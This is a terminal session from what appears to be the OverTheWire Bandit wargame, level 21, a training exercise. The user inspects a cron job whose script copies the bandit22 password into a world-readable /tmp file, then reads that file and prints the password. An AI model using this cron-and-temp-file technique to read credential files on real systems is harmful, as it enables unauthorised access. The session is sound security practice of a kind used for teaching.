bandit21@bandit:~$ ls -al
total 24
drwxr-xr-x  2 root     root     4096 May  7 20:14 .
drwxr-xr-x 41 root     root     4096 May  7 20:14 ..
-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout
-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc
-r--------  1 bandit21 bandit21   33 May  7 20:14 .prevpass
-rw-r--r--  1 root     root      675 May 15  2017 .profile
bandit21@bandit:~$ ls -al /etc/cron.d
total 36
drwxr-xr-x  2 root root 4096 May 14 14:04 .
drwxr-xr-x 87 root root 4096 May 14 09:41 ..
-rw-r--r--  1 root root   62 May 14 13:40 cronjob_bandit15_root
-rw-r--r--  1 root root   62 May 14 14:03 cronjob_bandit17_root
-rw-r--r--  1 root root  120 May  7 20:14 cronjob_bandit22
-rw-r--r--  1 root root  122 May  7 20:14 cronjob_bandit23
-rw-r--r--  1 root root  120 May 14 09:41 cronjob_bandit24
-rw-r--r--  1 root root   62 May 14 14:04 cronjob_bandit25_root
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
bandit21@bandit:~$ cat /etc/cron.d/cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
bandit21@bandit:~$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit21@bandit:~$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
